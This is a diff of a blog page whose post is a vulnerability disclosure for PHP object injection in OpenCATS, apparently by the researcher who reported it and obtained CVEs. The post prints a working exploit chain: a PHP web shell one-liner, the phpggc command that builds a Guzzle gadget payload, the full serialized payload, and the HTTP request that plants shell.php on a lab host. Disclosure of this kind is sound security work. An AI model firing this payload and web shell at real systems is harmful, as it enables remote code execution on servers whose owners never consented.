@@ -15,9 +15,16 @@
 
   <!-- External libraries -->
   <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
-  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
+  <!--<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/.min.css"> -->
   <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">
 
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.8/styles/default.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.8/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+
+
+  <
+  
   <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
   <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
   <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
@@ -42,7 +49,7 @@
   
   <!-- Facebook OGP cards -->
   <meta property="og:description" content="Introduction" />
-  <meta property="og:url" content="http://localhost:4000" />
+  <meta property="og:url" content="http://localhost:4000/web-application-security/2021/01/16/09_opencats_php_object_injection.html">
   <meta property="og:site_name" content="💻 | Blog" />
   <meta property="og:title" content="OpenCATS PHP Object Injection to Arbitrary File Write" />
   <meta property="og:type" content="website" />
@@ -58,7 +65,7 @@
   <meta name="twitter:title" content="OpenCATS PHP Object Injection to Arbitrary File Write">
   <meta name="twitter:description" content="Introduction">
   <meta name="twitter:image" content="http://localhost:4000/assets/logo.png">
-  <meta name="twitter:url" content="http://localhost:4000">
+  <meta name="twitter:url" content="http://localhost:4000/web-application-security/2021/01/16/09_opencats_php_object_injection.html">
   
 
   
@@ -66,7 +73,12 @@
   <!-- Site styles -->
   <link rel="stylesheet" href="/css/main.css">
   <link rel="canonical" href="http://localhost:4000/web-application-security/2021/01/16/09_opencats_php_object_injection.html">
-  <link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://localhost:4000/feed.xml" />
+	<link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://localhost:4000/feed.xml" />
+	
+	<!-- Tooltips -->
+	<script type="text/javascript">
+		window.tooltips = []
+	</script>
 </head>
 
 
@@ -84,31 +96,70 @@
     </a>
     <nav role="navigation">
       <ul id="js-navigation-menu" class="navigation-menu show">
-        
-          
-          <li class="nav-link"><a href="/about/">About</a>
-          
-        
-          
-        
-          
-        
-          
-        
-          
-          <li class="nav-link"><a href="/posts/">Posts</a>
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
+				
+	
+	<li class="nav-link"><a href="/about/">About</a>
+	
+
+	
+
+	
+
+	
+	<li class="nav-link"><a href="/posts/">Posts</a>
+	
+
+	
+	<li class="nav-link"><a href="/wallofsheep/">Wall Of Sheep</a>
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+
       </ul>
     </nav>
   </div>
@@ -147,36 +198,37 @@
 </section>
 
 <article class="post-content">
-  <h2 id="introduction">Introduction</h2>
+  <h3 id="introduction">Introduction</h3>
 
-<p>OpenCATS is an application tracking system that is written in PHP. More about OpenCATS can be seen here: <a href="https://www.opencats.org/">https://www.opencats.org/</a>. OpenCATS is vulnerable to PHP Object injection, by leveraging this vulnerability, it is possible to conduct arbitrary file write and execute arbitrary code on a system.</p>
+<p>OpenCATS is an application tracking system that is written in PHP. More about OpenCATS can be seen here: https://www.opencats.org/. OpenCATS is vulnerable to PHP Object injection, by leveraging this vulnerability, it is possible to conduct arbitrary file write and execute arbitrary code on a system.</p>
 
-<h2 id="technical-details">Technical Details</h2>
+<h3 id="technical-details">Technical Details</h3>
 
 <p>OpenCATS has an activity area to keep track of activities.</p>
 
-<p><img src="/assets/opencats/1.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/open1.png" alt="" /></p>
 
 <p>The following request is being sent to the application as part of a normal application workflow.</p>
 
-<p><img src="/assets/opencats/2.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/open2.png" alt="" /></p>
 
-<p>The <code class="language-plaintext highlighter-rouge">parametersactivity:ActivityDataGrid</code> parameter is sending serialized data as seen below which is being deserialized by the application using the <code class="language-plaintext highlighter-rouge">unserialize</code> function.</p>
+<p>The parametersactivity:ActivityDataGrid parameter is sending serialized data as seen below which is being deserialized by the application using the unserialize function.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a:9:{s:10:"rangeStart";i:0;s:10:"maxResults";i:15;s:13:"filterVisible";b:0;s:9:"startDate";s:0:"";s:7:"endDate";s:0:"";s:6:"period";s:37:"DATE_SUB(CURDATE(), INTERVAL 1 MONTH)";s:6:"sortBy";s:15:"dateCreatedSort";s:13:"sortDirection";s:4:"DESC";s:11:"filterAlpha";s:1:"L";}
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a:9:{s:10:"rangeStart";i:0;s:10:"maxResults";i:15;s:13:"filterVisible";b:0;s:9:"startDate";s:0:"";s:7:"endDate";s:0:"";s:6:"period";s:37:"DATE_SUB(CURDATE(), INTERVAL 1 MONTH)";s:6:"sortBy";s:15:"dateCreatedSort";s:13:"sortDirection";s:4:"DESC";s:11:"filterAlpha";s:1:"L";}
 </code></pre></div></div>
 
-<p>The <code class="language-plaintext highlighter-rouge">unserialize</code> function can be seen in <code class="language-plaintext highlighter-rouge">DataGrid.php</code></p>
+<p>The unserialize function can be seen in DataGrid.php</p>
 
-<p><img src="/assets/opencats/3.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/open3.png" alt="" /></p>
 
-<p><em><code class="language-plaintext highlighter-rouge">https://github.com/opencats/OpenCATS/blob/develop/lib/DataGrid.php#L272</code></em></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/opencats/OpenCATS/blob/develop/lib/DataGrid.php#L272
+</code></pre></div></div>
 
-<p>To exploit with vulnerability, a POP gadget chain can be created using <code class="language-plaintext highlighter-rouge">guzzlehttp</code>. A <code class="language-plaintext highlighter-rouge">__destruct</code> magic method available within <code class="language-plaintext highlighter-rouge">/var/www/public/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code> can be leveraged to write arbitrary files to the system.</p>
+<p>To exploit with vulnerability, a POP gadget chain can be created using guzzlehttp. A <code class="highlighter-rouge">__destruct</code> magic method available within <code class="highlighter-rouge">/var/www/public/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code> can be leveraged to write arbitrary files to the system.</p>
 
 <p>The relevant code that needs to be triggered can be seen below:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    public function __destruct()
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  public function __destruct()
     {
         $this-&gt;save($this-&gt;filename);
     }
@@ -203,24 +255,24 @@
         }
     }
 </code></pre></div></div>
-<p>In the above example, the <code class="language-plaintext highlighter-rouge">destruct()</code> magic method calls the <code class="language-plaintext highlighter-rouge">save()</code> method on the FileCookieJar class. The <code class="language-plaintext highlighter-rouge">save</code> method take a value called <code class="language-plaintext highlighter-rouge">filename</code> which is a property of an object, The contents of th is file comes from the <code class="language-plaintext highlighter-rouge">$json</code> array which get the value from <code class="language-plaintext highlighter-rouge">$cookie-&gt;toArray()</code>, and $cookie being an object.</p>
 
-<p>Multiple checks are also done to ensure that <code class="language-plaintext highlighter-rouge">$cookie-&gt;getExpires()</code> returns true and <code class="language-plaintext highlighter-rouge">$cookie-&gt;getDiscard()</code> returns false. After these checks, The <code class="language-plaintext highlighter-rouge">$json</code> array is then json encoded and written to a file using the <code class="language-plaintext highlighter-rouge">file_put_contents</code> function.</p>
+<p>In the above example, the <code class="highlighter-rouge">destruct()</code> magic method calls the save() method on the <code class="highlighter-rouge">FileCookieJar</code> class. The save method take a value called filename which is a property of an object, The contents of th is file comes from the $json array which get the value from <code class="highlighter-rouge">$cookie-&gt;toArray()</code>, and $cookie being an object.</p>
 
-<p>This is an already known gadget found by <code class="language-plaintext highlighter-rouge">cf</code> which is available within <code class="language-plaintext highlighter-rouge">Guzzle</code> versions 6.0.0 &lt;= 6.3.3+</p>
+<p>Multiple checks are also done to ensure that $cookie-&gt;getExpires() returns true and $cookie-&gt;getDiscard() returns false. After these checks, The <code class="highlighter-rouge">$json array</code> is then json encoded and written to a file using the file_put_contents function.</p>
+
+<p>This is an already known gadget found by cf which is available within Guzzle versions <code class="highlighter-rouge">6.0.0 &lt;= 6.3.3+</code></p>
 
 <p><a href="https://github.com/ambionics/phpggc">phpggc</a> can be used to generate a serialized exploit payload for this gadget</p>
 
-<p>A payload such as <code class="language-plaintext highlighter-rouge">&lt;?php echo shell_exec($_GET['e'].' 2&gt;&amp;1'); ?&gt;</code> can now be used with phpggc to generate a serialized gadget chain which will store <code class="language-plaintext highlighter-rouge">shell.php</code> within <code class="language-plaintext highlighter-rouge">/var/www/public/shell.php</code> of the target OpenCAT system.</p>
+<p>A payload such as <code class="highlighter-rouge"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'e'</span><span class="p">]</span><span class="o">.</span><span class="s1">' 2&gt;&amp;1'</span><span class="p">);</span> <span class="cp">?&gt;</span></code> can now be used with phpggc to generate a serialized gadget chain which will store shell.php within <code class="highlighter-rouge">/var/www/public/shell.php</code> of the target OpenCAT system.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>💻  📂  🍣 master ❯ ./phpggc -u --fast-destruct Guzzle/FW1 /var/www/public/shell.php  /tmp/shell.php 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>💻  📂  🍣 master ❯ ./phpggc -u --fast-destruct Guzzle/FW1 /var/www/public/shell.php  /tmp/shell.php 
 a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fvar%2Fwww%2Fpublic%2Fshell.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A45%3A%22%3C%3Fphp+echo+shell_exec%28%24_GET%5B%27e%27%5D.%27+2%3E%261%27%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D
-
 </code></pre></div></div>
 
 <p>The request with the payload can now be sent.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /index.php?m=activity&amp;parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fvar%2Fwww%2Fpublic%2Fshell.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A45%3A%22%3C%3Fphp+echo+shell_exec%28%24_GET%5B%27e%27%5D.%27+2%3E%261%27%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D HTTP/1.12
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /index.php?m=activity&amp;parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fvar%2Fwww%2Fpublic%2Fshell.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A45%3A%22%3C%3Fphp+echo+shell_exec%28%24_GET%5B%27e%27%5D.%27+2%3E%261%27%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D HTTP/1.12
 Host: dvws.local
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -232,16 +284,15 @@ Cookie: _pc_tvs=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDkzNjMwNTYsInB
 Upgrade-Insecure-Requests: 1
 </code></pre></div></div>
 
-<p>The <code class="language-plaintext highlighter-rouge">shell.php</code> can now be leveraged to execute arbitrary code.</p>
+<p>The <code class="highlighter-rouge">shell.php</code> can now be leveraged to execute arbitrary code.</p>
 
-<p><img src="/assets/opencats/4.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/open4.png" alt="" /></p>
 
-<p><strong>Note:Multiple other areas within OpenCATs are also taking deserialized user input which can be leveraged for the same vulnerability. Also, Multiple Cross-site Scripting (XSS) issues also exist on this codebase.</strong></p>
+<p><strong>Note:</strong> Multiple other areas within OpenCATs are also taking deserialized user input which can be leveraged for the same vulnerability. Also, Multiple Cross-site Scripting (XSS) issues also exist on this codebase.</p>
 
-<p><img src="/assets/opencats/5.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/open5.png" alt="" /></p>
 
 <p>I’ve opened a GitHub issue to report this <a href="https://github.com/opencats/OpenCATS/issues/515">issue</a> and CVE has assigned two CVEs as well: CVE-2021-25294 and CVE-2021-25295</p>
-
 
 </article>
 
@@ -273,20 +324,6 @@ Upgrade-Insecure-Requests: 1
     
     
     
-      <a href="//www.facebook.com/sharer.php?t=OpenCATS+PHP+Object+Injection+to+Arbitrary+File+Write&u=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2021%2F01%2F16%2F09_opencats_php_object_injection.html"
-        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
-        <i class="fa fa-facebook-square fa-lg"></i>
-      </a>
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
     
     
     
@@ -307,120 +344,32 @@ Upgrade-Insecure-Requests: 1
     
     
   
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-      <a href="//www.pinterest.com/pin/create/button/?description=OpenCATS+PHP+Object+Injection+to+Arbitrary+File+Write&url=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2021%2F01%2F16%2F09_opencats_php_object_injection.html&media=http://localhost:4000/assets/header_img.jpg"
-        onclick="window.open(this.href, 'pinterest-share', 'width=550,height=255');return false;">
-        <i class="fa fa-pinterest-square fa-lg"></i>
-      </a>
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
 </section>
+
+	<section class="post-navigation">
+		<span class="prev-post">
+			
+				<a href="/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html">
+					<span class="fa-stack fa-lg">
+						<i class="fa fa-square fa-stack-2x"></i>
+						<i class="fa fa-angle-double-left fa-stack-1x fa-inverse"></i>
+					</span>
+					<span class="page-number">PHP Object Injection Exploitation Notes</span>
+				</a>
+			
+		</span>
+		<span class="next-post">
+			
+				<a href="/application-security/2021/04/14/09_adempierie_java_deserialization.html">
+					<span class="page-number">ADempiere Unsafe Deserialization to Code Execution</span>
+					<span class="fa-stack fa-lg">
+						<i class="fa fa-square fa-stack-2x"></i>
+						<i class="fa fa-angle-double-right fa-stack-1x fa-inverse"></i>
+					</span>
+				</a>
+			
+		</span>
+	</section>
 
 
 
@@ -440,31 +389,70 @@ Upgrade-Insecure-Requests: 1
 
       <p><strong>Site Map</strong></p>
       <ul class="pages">
-        
-        
-          <li class="nav-link"><a href="/about/">About</a>
-        
-        
-        
-        
-        
-        
-        
-        
-        
-          <li class="nav-link"><a href="/posts/">Posts</a>
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
+				
+	
+	<li class="nav-link"><a href="/about/">About</a>
+	
+
+	
+
+	
+
+	
+	<li class="nav-link"><a href="/posts/">Posts</a>
+	
+
+	
+	<li class="nav-link"><a href="/wallofsheep/">Wall Of Sheep</a>
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+
       </ul>
     </div>
 
@@ -473,9 +461,9 @@ Upgrade-Insecure-Requests: 1
       <p><strong>Contact</strong></p>
       <ul class="social-media-list">
         <li>
-          <a href="mailto:na">
+          <a href="mailto:@snoopysecurity">
             <i class="fa fa-envelope-o"></i>
-            <span class="username">na</span>
+            <span class="username">@snoopysecurity</span>
           </a>
         </li>
 
@@ -490,8 +478,6 @@ Upgrade-Insecure-Requests: 1
           
         
           
-        
-          
           <li>
             <a href="https://github.com/snoopysecurity" title="Fork me on GitHub">
               <i class="fa fa-github"></i>
@@ -501,29 +487,12 @@ Upgrade-Insecure-Requests: 1
           
         
           
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
+          <li>
+            <a href="https://www.linkedin.com/pub/sam-sanoop/47/769/60a" title="Connect with me on LinkedIn">
+              <i class="fa fa-linkedin"></i>
+              <span class="username">Sam Sanoop</span>
+            </a>
+          </li>
           
         
 
@@ -532,7 +501,7 @@ Upgrade-Insecure-Requests: 1
 
     <div class="site-signature">
       <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
-      <p class="text">Hacking to learn, while learning to hack.
+      <p class="text">Hack adventures while segfaulting through life
 </p>
     </div>
 
@@ -541,9 +510,11 @@ Upgrade-Insecure-Requests: 1
 </footer>
 
 <!-- Scripts -->
-<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>
+<script src="//code.jquery.com/jquery-3.4.1.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js"></script>
+<script src="//unpkg.com/popper.js@1"></script>
+<script src="//unpkg.com/tippy.js@5"></script>
 
 <script type="text/javascript">
 $(document).ready(function() {
@@ -561,6 +532,15 @@ $(document).ready(function() {
       }
     });
   });
+
+	// Enable tooltips via Tippy.js
+	if (Array.isArray(window.tooltips)) {
+		window.tooltips.forEach(function(tooltip) {
+			var selector = tooltip[0];
+			var config = tooltip[1];
+			tippy(selector, config);
+		})
+	}
 });
 
 </script>
